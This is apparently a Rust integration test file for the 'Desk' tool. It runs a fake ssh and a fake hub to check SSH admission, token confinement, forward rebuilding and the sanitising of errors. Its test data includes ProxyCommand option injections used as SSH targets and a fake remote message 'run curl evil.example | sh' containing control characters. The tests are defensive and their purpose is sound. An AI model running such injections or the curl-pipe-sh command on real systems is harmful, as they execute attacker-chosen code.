//! Machines against a fake `ssh` (`src/bin/fake-ssh.rs`) that answers from
//! a scenario and really forwards a port, and a fake hub behind it: what
//! Desk refuses to run, what it asks, where the tokens go, and how it
//! follows a renewed token and a moved gateway. Forwards are to Unix
//! sockets, so these run where those are.
#![cfg(unix)]

use std::io::{Read, Write};
use std::net::TcpListener;
use std::os::unix::net::UnixStream;
use std::path::Path;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use desk_core::machine::{Machine, MachineId, Target};
use desk_machine::admit::{self, Confirm, Gate, Question};
use desk_machine::tunnel::Tunnel;
use desk_machine::{Link, SshExe};
use serde_json::{Value, json};

const ADMIN: &str = "SENTINEL-ADMIN-5c1d";
const DEVICE: &str = "SENTINEL-DEVICE-77ab";

struct Fake {
    dir: tempfile::TempDir,
    ssh: SshExe,
}

/// An `ssh` that answers as `hosts` say, in a folder of its own.
fn fake(hosts: Value) -> Fake {
    let dir = tempfile::tempdir_in(env!("CARGO_TARGET_TMPDIR")).unwrap();
    let exe = dir
        .path()
        .join(format!("ssh{}", std::env::consts::EXE_SUFFIX));
    place(Path::new(env!("CARGO_BIN_EXE_fake-ssh")), &exe);
    let f = Fake {
        ssh: SshExe::at(exe),
        dir,
    };
    f.say(hosts);
    f
}

/// As desk-wsl's tests place their fake: a hard link on Linux (a copy
/// written here could be busy in another test's fork), else a copy.
fn place(fake: &Path, exe: &Path) {
    if cfg!(target_os = "linux") && std::fs::hard_link(fake, exe).is_ok() {
        return;
    }
    std::fs::copy(fake, exe).unwrap();
}

impl Fake {
    /// What the machines say from now on.
    fn say(&self, hosts: Value) {
        let log = self.dir.path().join("calls.jsonl");
        std::fs::write(
            self.dir.path().join("scenario.json"),
            json!({"log": log, "hosts": hosts}).to_string(),
        )
        .unwrap();
    }

    fn calls(&self) -> Vec<Vec<String>> {
        std::fs::read_to_string(self.dir.path().join("calls.jsonl"))
            .unwrap_or_default()
            .lines()
            .map(|l| serde_json::from_str(l).unwrap())
            .collect()
    }
}

fn machine(target: &str) -> Machine {
    Machine {
        id: MachineId::new("devbox").unwrap(),
        name: "devbox".into(),
        target: Target::new(target).unwrap(),
    }
}

/// A machine whose Desk Helper says its hub is at `box_port`.
fn host(target: &str, box_port: u16, admin: &str, device: &str) -> Value {
    json!({
        "target": target,
        "settings": "user dev\nhostname 203.0.113.7\nport 22\n",
        "commands": [
            {"contains": "desk-helper connection --json", "stdout": json!({
                "gateway_url": format!("http://127.0.0.1:{box_port}"),
                "admin_token": admin,
                "device_token": device,
            }).to_string()},
            {"contains": "printf", "stdout": "/home/dev\n"},
            {"contains": "true"}
        ]
    })
}

/// A hub on this computer's loopback (the machine's, as far as the forward
/// knows) that tells what Authorization each request carried, answering
/// 401 to any token but `good`.
fn hub(good: &'static str) -> (u16, Arc<Mutex<Vec<String>>>) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let seen = Arc::new(Mutex::new(Vec::new()));
    let heard = Arc::clone(&seen);
    std::thread::spawn(move || {
        for s in listener.incoming() {
            let Ok(mut s) = s else { continue };
            let mut buf = Vec::new();
            let mut chunk = [0u8; 1024];
            while !buf.windows(4).any(|w| w == b"\r\n\r\n") {
                match s.read(&mut chunk) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => buf.extend_from_slice(&chunk[..n]),
                }
            }
            let head = String::from_utf8_lossy(&buf).to_string();
            let auth = head
                .lines()
                .find_map(|l| l.strip_prefix("authorization: Bearer "))
                .unwrap_or_default()
                .to_string();
            if head.is_empty() {
                continue;
            }
            let status = if auth == good {
                "200 OK"
            } else {
                "401 Unauthorized"
            };
            heard.lock().unwrap().push(auth);
            let _ = s.write_all(
                format!("HTTP/1.1 {status}\r\ncontent-length: 0\r\nconnection: close\r\n\r\n")
                    .as_bytes(),
            );
        }
    });
    (port, seen)
}

/// A request with `token` through `link`'s socket, as the broker sends one:
/// the status line, or none when nothing answered.
fn get(link: &Link, token: &str) -> Option<String> {
    let mut s = UnixStream::connect(link.socket()).ok()?;
    s.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
    s.write_all(
        format!(
            "GET /api/desk/engines HTTP/1.1\r\nhost: 127.0.0.1\r\nauthorization: Bearer {token}\r\n\r\n"
        )
        .as_bytes(),
    )
    .ok()?;
    let mut answer = String::new();
    let _ = s.read_to_string(&mut answer);
    answer.lines().next().map(str::to_string)
}

fn link(f: &Fake, target: &str) -> Link {
    let m = machine(target);
    let dir = desk_machine::link::socket_dir(&f.dir.path().join("s")).unwrap();
    let socket = desk_machine::link::socket_for(&dir, &m.id);
    let tunnel = Tunnel::with_timing(
        f.ssh.clone(),
        m.clone(),
        socket,
        Duration::from_secs(10),
        Duration::from_millis(50),
        Duration::from_millis(400),
    );
    Link::with_tunnel(m, f.ssh.clone(), tunnel, Duration::from_secs(10))
        .with_gap(Duration::from_millis(100))
}

struct Answer {
    yes: bool,
    asked: AtomicUsize,
    last: Mutex<Option<Question>>,
}

impl Confirm for Answer {
    fn run_on(&self, q: &Question) -> bool {
        self.asked.fetch_add(1, Ordering::SeqCst);
        *self.last.lock().unwrap() = Some(q.clone());
        self.yes
    }
}

fn answer(yes: bool) -> Arc<Answer> {
    Arc::new(Answer {
        yes,
        asked: AtomicUsize::new(0),
        last: Mutex::default(),
    })
}

fn reads(f: &Fake) -> usize {
    f.calls()
        .iter()
        .filter(|c| c.join(" ").contains("connection --json"))
        .count()
}

/// Waits up to `ms` for `ok`.
fn soon(ms: u64, mut ok: impl FnMut() -> bool) -> bool {
    let until = std::time::Instant::now() + Duration::from_millis(ms);
    while std::time::Instant::now() < until {
        if ok() {
            return true;
        }
        std::thread::sleep(Duration::from_millis(5));
    }
    ok()
}
#[test]
fn a_target_that_is_an_option_never_reaches_ssh() {
    let f = fake(json!([host("devbox", 1, ADMIN, DEVICE)]));
    let yes = answer(true);
    let gate = Gate::new(yes.clone());
    for target in [
        "-oProxyCommand=x",
        "-oProxyCommand=touch /tmp/pwned",
        "-F/tmp/evil",
        "dev box",
        "devbox -oProxyCommand=x",
        "devbox\n",
        "-",
    ] {
        let id = MachineId::new("devbox").unwrap();
        assert!(
            admit::admit(&gate, &f.ssh, id, "devbox", target).is_err(),
            "{target:?}"
        );
    }
    assert!(f.calls().is_empty(), "ssh was never run");
    assert_eq!(yes.asked.load(Ordering::SeqCst), 0, "nor anyone asked");
}

#[test]
fn adding_asks_first_and_runs_nothing_on_a_cancel() {
    let f = fake(json!([host("devbox", 1, ADMIN, DEVICE)]));
    let no = answer(false);
    let id = MachineId::new("devbox").unwrap();
    let e = admit::admit(&Gate::new(no.clone()), &f.ssh, id, "devbox", "devbox").unwrap_err();
    assert!(e.contains("cancelled"), "{e}");
    // Not even `ssh -G`: a config's `Match exec` runs commands.
    assert!(f.calls().is_empty(), "{:?}", f.calls());
    let q = no.last.lock().unwrap().clone().unwrap();
    assert!(q.text().lines().any(|l| l == "devbox"));
}

#[test]
fn a_host_the_mac_doesnt_know_is_refused_with_how_to_fix_it() {
    let mut h = host("devbox", 1, ADMIN, DEVICE);
    h["refuse"] = json!({"stderr": "No ED25519 host key is known for devbox and you have requested strict checking.\nHost key verification failed.", "code": 255});
    let f = fake(json!([h]));
    let id = MachineId::new("devbox").unwrap();
    let e = admit::admit(&Gate::new(answer(true)), &f.ssh, id, "devbox", "devbox").unwrap_err();
    assert!(
        e.contains("Connect to devbox once with ssh in a terminal"),
        "{e}"
    );
    let reach = f.calls().pop().unwrap();
    assert!(
        reach
            .windows(2)
            .any(|w| w == ["-o", "StrictHostKeyChecking=yes"])
    );
    assert!(reach.windows(2).any(|w| w == ["-o", "BatchMode=yes"]));
}

/// A cloud VM behind a jump host, reached by a Host alias in the person's
/// config: the config's user and jump apply, and Desk's own options
/// override none of how it gets there or who it logs in as.
#[test]
fn an_alias_through_a_jump_host_is_the_persons_config_applied() {
    let mut h = host("prod-api", 1, ADMIN, DEVICE);
    h["settings"] = json!(
        "user ec2-user\nhostname 10.0.1.20\nproxyjump bastion.example.com\nidentityfile ~/.ssh/prod\nport 22\n"
    );
    let f = fake(json!([h]));
    let yes = answer(true);
    let id = MachineId::new("prod-api").unwrap();
    let (m, settings) =
        admit::admit(&Gate::new(yes.clone()), &f.ssh, id, "prod-api", "prod-api").unwrap();
    assert_eq!(m.target.as_str(), "prod-api");
    assert_eq!(settings.via.as_deref(), Some("bastion.example.com"));
    assert_eq!(settings.user.as_deref(), Some("ec2-user"));
    assert_eq!(yes.asked.load(Ordering::SeqCst), 1);
    for call in f.calls() {
        let dash = call.iter().position(|a| a == "--").unwrap();
        assert_eq!(call[dash + 1], "prod-api", "the alias, as typed");
        for a in &call[..dash] {
            for overriding in ["-J", "-i", "-l", "-F", "-p"] {
                assert_ne!(a, overriding, "{call:?}");
            }
            for key in [
                "User=",
                "ProxyJump=",
                "ProxyCommand=",
                "IdentityFile=",
                "HostName=",
                "Port=",
            ] {
                assert!(!a.starts_with(key), "{a} in {call:?}");
            }
        }
    }
}

#[test]
fn a_config_that_forwards_ports_is_refused() {
    let mut h = host("devbox", 1, ADMIN, DEVICE);
    h["settings"] = json!("user dev\nremoteforward [127.0.0.1]:9000 [127.0.0.1]:9000\n");
    let f = fake(json!([h]));
    let yes = answer(true);
    let id = MachineId::new("devbox").unwrap();
    let e = admit::admit(&Gate::new(yes.clone()), &f.ssh, id, "devbox", "devbox").unwrap_err();
    assert!(e.contains("remoteforward"), "{e}");
    // Asked first; then nothing connected.
    assert_eq!(yes.asked.load(Ordering::SeqCst), 1);
    assert!(f.calls().iter().all(|c| c.contains(&"-G".to_string())));
}

/// The tokens go only into the forward's socket here (the person's alone,
/// in a folder only they can open; no TCP port at all), and from there
/// reach the hub: never anywhere else, never in an ssh command line.
#[test]
fn the_tokens_only_go_into_the_forwards_socket() {
    use std::os::unix::fs::{FileTypeExt, PermissionsExt};
    let (box_port, seen) = hub(ADMIN);
    let f = fake(json!([host("devbox", box_port, ADMIN, DEVICE)]));
    let link = link(&f, "devbox");
    let c = link.read().unwrap().unwrap();
    // A name that resolves nowhere: only the socket reaches anything.
    assert_eq!(
        c.gateway_url,
        format!("http://devbox.machine.invalid:{box_port}")
    );
    assert!(desk_core::net::loopback_url(&c.gateway_url).is_err());
    assert_eq!(c.device_token.as_deref(), Some(DEVICE));
    let meta = std::fs::symlink_metadata(link.socket()).unwrap();
    assert!(meta.file_type().is_socket());
    assert_eq!(meta.permissions().mode() & 0o077, 0);
    let dir = std::fs::metadata(link.socket().parent().unwrap()).unwrap();
    assert_eq!(dir.permissions().mode() & 0o777, 0o700);
    assert_eq!(
        get(&link, &c.admin_token).as_deref(),
        Some("HTTP/1.1 200 OK")
    );
    assert_eq!(seen.lock().unwrap().last().map(String::as_str), Some(ADMIN));
    let forward = f
        .calls()
        .into_iter()
        .find(|c| c.contains(&"-L".to_string()))
        .unwrap();
    let spec = &forward[forward.iter().position(|a| a == "-L").unwrap() + 1];
    assert!(
        spec.starts_with(&*link.socket().to_string_lossy()),
        "{spec}"
    );
    for call in f.calls() {
        let line = call.join(" ");
        assert!(!line.contains(ADMIN) && !line.contains(DEVICE), "{line}");
    }
    assert!(!format!("{c:?}").contains(ADMIN));
    assert!(!format!("{c:?}").contains(DEVICE));
}

/// A machine that says what ssh says when a forward listens (in its
/// banner, say) doesn't make one: only the socket being there and taking
/// a connection does.
#[test]
fn a_machine_claiming_to_listen_is_not_believed() {
    let mut h = host("devbox", 1, ADMIN, DEVICE);
    h["banner"] = json!(
        "debug1: channel 0: new port-listener [port listener]\nLocal forwarding listening on 127.0.0.1 port 1.\n"
    );
    h["listen"] = json!(false);
    let f = fake(json!([h]));
    let m = machine("devbox");
    let dir = desk_machine::link::socket_dir(&f.dir.path().join("s")).unwrap();
    let tunnel = Tunnel::with_timing(
        f.ssh.clone(),
        m.clone(),
        desk_machine::link::socket_for(&dir, &m.id),
        Duration::from_millis(600),
        Duration::from_millis(50),
        Duration::from_millis(400),
    );
    let e = tunnel.ensure(1, Duration::from_secs(5)).unwrap_err();
    assert!(e.contains("in time"), "{e}");
    assert_eq!(tunnel.up(), None);
}

#[test]
fn a_hub_on_the_machine_off_its_loopback_is_refused() {
    let mut h = host("devbox", 1, ADMIN, DEVICE);
    h["commands"][0]["stdout"] = json!(
        json!({
            "gateway_url": "http://0.0.0.0:4226", "admin_token": ADMIN, "device_token": DEVICE
        })
        .to_string()
    );
    let f = fake(json!([h]));
    let e = link(&f, "devbox").read().unwrap_err();
    assert!(e.contains("own loopback"), "{e}");
    assert!(!e.contains(ADMIN));
    // No forward was started for it.
    assert!(!f.calls().iter().any(|c| c.contains(&"-L".to_string())));
}

/// Desk Helper on the machine restarted and renewed its tokens: the kept
/// ones are refused, and reading again over SSH gets the new ones.
#[test]
fn a_renewed_token_is_read_again_over_ssh() {
    let (box_port, seen) = hub("SENTINEL-ADMIN-new");
    let f = fake(json!([host("devbox", box_port, ADMIN, DEVICE)]));
    let link = link(&f, "devbox");
    link.read().unwrap().unwrap();
    f.say(json!([host(
        "devbox",
        box_port,
        "SENTINEL-ADMIN-new",
        "SENTINEL-DEVICE-new"
    )]));
    // Kept: the same, until it is refused.
    let kept = link.connection().unwrap().unwrap();
    assert_eq!(kept.admin_token, ADMIN);
    assert_eq!(
        get(&link, &kept.admin_token).as_deref(),
        Some("HTTP/1.1 401 Unauthorized")
    );
    link.forget();
    let new = link.connection().unwrap().unwrap();
    assert_eq!(new.admin_token, "SENTINEL-ADMIN-new");
    assert_eq!(new.device_token.as_deref(), Some("SENTINEL-DEVICE-new"));
    assert_eq!(
        get(&link, &new.admin_token).as_deref(),
        Some("HTTP/1.1 200 OK")
    );
    assert_eq!(seen.lock().unwrap().len(), 2);
    // The same forward: the gateway didn't move.
    assert_eq!(
        f.calls()
            .iter()
            .filter(|c| c.contains(&"-L".to_string()))
            .count(),
        1
    );
}

/// Many asking at once (a burst of requests turned away) make one read
/// over SSH, and reads after it wait out the gap: never a burst of logins.
#[test]
fn reads_over_ssh_are_one_at_a_time_and_spaced_out() {
    let (box_port, _) = hub(ADMIN);
    let f = fake(json!([host("devbox", box_port, ADMIN, DEVICE)]));
    let link = Arc::new(link(&f, "devbox").with_gap(Duration::from_millis(400)));
    link.read().unwrap();
    let all: Vec<_> = (0..8)
        .map(|_| {
            let link = Arc::clone(&link);
            std::thread::spawn(move || link.read().unwrap().unwrap().admin_token)
        })
        .collect();
    for t in all {
        assert_eq!(t.join().unwrap(), ADMIN);
    }
    assert!(reads(&f) <= 2, "{} reads", reads(&f));
    let started = std::time::Instant::now();
    link.read().unwrap();
    link.read().unwrap();
    assert!(started.elapsed() >= Duration::from_millis(300));
}

/// Desk Helper moved the machine's gateway to another port: the old
/// forward reaches nothing (ssh closes what it can't reach), reading again
/// rebuilds it to the new port, on the same socket here.
#[test]
fn a_moved_gateway_rebuilds_the_forward() {
    let gone = {
        let l = TcpListener::bind("127.0.0.1:0").unwrap();
        l.local_addr().unwrap().port()
    };
    let f = fake(json!([host("devbox", gone, ADMIN, DEVICE)]));
    let link = link(&f, "devbox");
    let before = link.read().unwrap().unwrap();
    assert_eq!(get(&link, ADMIN), None, "nothing answers there");
    let (moved, seen) = hub(ADMIN);
    f.say(json!([host("devbox", moved, ADMIN, DEVICE)]));
    let after = link.read().unwrap().unwrap();
    assert_ne!(after.gateway_url, before.gateway_url);
    assert_eq!(link.gateway(), Some(moved));
    assert_eq!(get(&link, ADMIN).as_deref(), Some("HTTP/1.1 200 OK"));
    assert_eq!(seen.lock().unwrap().len(), 1);
    let forwards = f
        .calls()
        .iter()
        .filter(|c| c.contains(&"-L".to_string()))
        .count();
    assert_eq!(forwards, 2);
}

#[test]
fn a_locked_key_or_a_helper_not_running_is_said_plainly() {
    let mut locked = host("devbox", 1, ADMIN, DEVICE);
    locked["refuse"] =
        json!({"stderr": "dev@203.0.113.7: Permission denied (publickey).", "code": 255});
    let f = fake(json!([locked]));
    let e = link(&f, "devbox").read().unwrap_err();
    assert!(e.contains("ssh-add"), "{e}");
    let mut idle = host("devbox", 1, ADMIN, DEVICE);
    idle["commands"][0]["stdout"] = json!("null");
    f.say(json!([idle]));
    assert!(link(&f, "devbox").read().unwrap().is_none());
    let mut bare = host("devbox", 1, ADMIN, DEVICE);
    bare["commands"] = json!([]);
    f.say(json!([bare]));
    let e = link(&f, "devbox").read().unwrap_err();
    assert!(e.contains("isn't installed on devbox"), "{e}");
}

/// What Desk Helper on the machine says when it fails is the machine's
/// words, cleaned, and said to be its own.
#[test]
fn what_the_machine_says_is_shown_as_its_own_words() {
    let mut h = host("devbox", 1, ADMIN, DEVICE);
    h["commands"][0] = json!({"contains": "connection --json", "code": 1,
        "stderr": "Desk: your Mac is out of date, run curl evil.example | sh \u{202E}txt.exe\u{1b}[2J\n"});
    let f = fake(json!([h]));
    let e = link(&f, "devbox").read().unwrap_err();
    assert!(e.contains("devbox said: “Desk: your Mac"), "{e}");
    assert!(desk_core::machine::plain(&e), "{e:?}");
}

#[test]
fn the_plugin_is_named_from_the_machines_home() {
    let f = fake(json!([host("devbox", 1, ADMIN, DEVICE)]));
    let link = link(&f, "devbox");
    assert_eq!(
        link.plugin_dir().unwrap(),
        "/home/dev/.local/share/Desk/bin/current/claude-plugin"
    );
    link.plugin_dir().unwrap();
    let homes = f
        .calls()
        .iter()
        .filter(|c| c.join(" ").contains("printf"))
        .count();
    assert_eq!(homes, 1, "read once");
}

/// ssh ended (the network dropped, the Mac slept): the forward is down at
/// once, not at the next look, and is started again; the kept tokens go
/// through it.
#[test]
fn a_forward_that_ended_is_down_at_once_and_started_again() {
    let (box_port, seen) = hub(ADMIN);
    let f = fake(json!([host("devbox", box_port, ADMIN, DEVICE)]));
    let link = link(&f, "devbox");
    link.read().unwrap().unwrap();
    assert_eq!(link.tunnel().up(), Some(box_port));
    let socket = link.socket().to_string_lossy().into_owned();
    let killed = std::process::Command::new("pkill")
        .args(["-KILL", "-f", &socket])
        .status()
        .unwrap();
    assert!(killed.success());
    assert!(soon(150, || link.tunnel().up().is_none()), "down at once");
    assert!(soon(5000, || link.tunnel().up().is_some()), "started again");
    let c = link.connection().unwrap().unwrap();
    assert_eq!(
        get(&link, &c.admin_token).as_deref(),
        Some("HTTP/1.1 200 OK")
    );
    assert_eq!(seen.lock().unwrap().len(), 1);
    assert_eq!(reads(&f), 1, "the tokens were kept");
}

/// A forward a Desk that ended left running is stopped when the next one
/// starts, and Desk's own forward ends when its tunnel does.
#[test]
fn no_forward_outlives_desk() {
    let (box_port, _) = hub(ADMIN);
    let f = fake(json!([host("devbox", box_port, ADMIN, DEVICE)]));
    let socket = {
        let link = link(&f, "devbox");
        link.read().unwrap().unwrap();
        link.socket().to_path_buf()
    };
    let pattern = socket.to_string_lossy().into_owned();
    let running = || {
        std::process::Command::new("pgrep")
            .args(["-f", &pattern])
            .output()
            .unwrap()
            .status
            .success()
    };
    // Ended with its tunnel, and cleared away after.
    let pid = socket.with_extension("pid");
    assert!(
        soon(3000, || !running() && !socket.exists() && !pid.exists()),
        "ended with its tunnel"
    );
    // One left behind: started by hand, its pid where Desk keeps it.
    let mut stray = f
        .ssh
        .command(&machine("devbox").forward(&socket, box_port))
        .spawn()
        .unwrap();
    std::fs::write(&pid, stray.id().to_string()).unwrap();
    assert!(soon(3000, || socket.exists()));
    let link = link(&f, "devbox");
    link.read().unwrap().unwrap();
    assert!(
        soon(3000, || matches!(stray.try_wait(), Ok(Some(_)))),
        "stopped"
    );
}
